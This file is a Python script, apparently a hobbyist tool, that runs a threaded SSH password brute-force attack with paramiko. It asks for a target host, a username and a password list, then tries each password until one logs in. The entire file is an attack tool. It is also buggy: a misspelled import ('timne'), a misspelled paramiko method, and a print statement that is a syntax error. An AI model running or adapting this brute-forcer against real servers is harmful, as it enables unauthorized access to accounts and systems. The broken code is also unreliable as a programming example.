import paramiko
import sys
import os
import socket
import termcolor
import threading
import timne

stop_flag  = 0

def ssh_connect(password, code=0):
    global stop_flag
    ssh = paramiko.SSHClient()
    ssh.set_missing_hos_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(host, port=22, username=username, password=password)
        stop_flag = 1
        print(termcolor.colored(('[~] Found Password: (', password, ' For Account: ', username), 'green'))
    except paramiko.AuthenticationException:
        print(termcolor.colored(('[!!] Incorrect Credential: (', password, ')'), 'red'))
    except socket.error as e:
        print('[!!] Cant Connect')
        sys.exit(1)
    ssh.close()

host = input('[~] Traget Address: ')
username = input('[~] SSH Username: ')

while True:
    try:
        passwd_file = input('[~] passwords File: ')
        print('*** Starting Threded SSH Bruteforce On ', host, 'with acount: ', username' ***')
        with open(passwd_file, 'r') as file:
            for line in file.readlines():
                if stop_flag == 1:
                    t.join()
                    exit()
                password = line.strip()
                t = threading.Thread(target=ssh_connect, args=(password,))
                t.start()
                time.sleep(0.5)
        break
    except FileNotFoundError as e:
        print('[!!] That File/Path Doesn\'t Exist ')
        print('Try Again')